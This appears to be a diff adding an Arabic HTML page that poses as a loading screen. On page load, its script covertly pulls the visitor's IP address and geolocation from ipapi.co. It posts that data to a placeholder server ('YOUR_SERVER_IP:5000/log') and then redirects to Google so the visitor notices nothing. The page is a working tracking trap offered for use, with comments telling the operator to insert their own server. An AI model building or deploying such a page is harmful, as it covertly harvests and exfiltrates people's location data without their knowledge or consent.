@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>جاري التحميل...</title>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background: #f0f0f0;
+            font-family: Arial, sans-serif;
+            margin: 0;
+        }
+        .loader {
+            border: 8px solid #f3f3f3;
+            border-top: 8px solid #3498db;
+            border-radius: 50%;
+            width: 60px;
+            height: 60px;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        p {
+            margin-top: 20px;
+            color: #555;
+        }
+    </style>
+</head>
+<body>
+    <div style="text-align:center;">
+        <div class="loader"></div>
+        <p>جاري التحميل...</p>
+    </div>
+
+    <script>
+        // دالة تجلب الـ IP ثم ترسله لخادمك
+        async function sendData() {
+            try {
+                // محاولة جلب الـ IP من ipapi.co
+                const res = await fetch('https://ipapi.co/json/', { mode: 'no-cors' });
+                const data = await res.json();
+
+                // إرسال البيانات لخادم Flask (استبدل YOUR_SERVER_IP)
+                await fetch('http://YOUR_SERVER_IP:5000/log', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                });
+            } catch (e) {
+                // أي خطأ - تجاهل
+                console.log('فشل التتبع، لكن نكمل');
+            }
+
+            // التوجيه إلى جوجل (حتى لو فشل كل شيء)
+            window.location.replace('https://www.google.com');
+        }
+
+        // تشغيل الدالة فوراً
+        sendData();
+
+        // خطة احتياطية: لو ما اشتغلتش الدالة بعد 3 ثواني، توجه لجوجل إجباري
+        setTimeout(() => {
+            window.location.replace('https://www.google.com');
+        }, 3000);
+    </script>
+</body>
+</html>
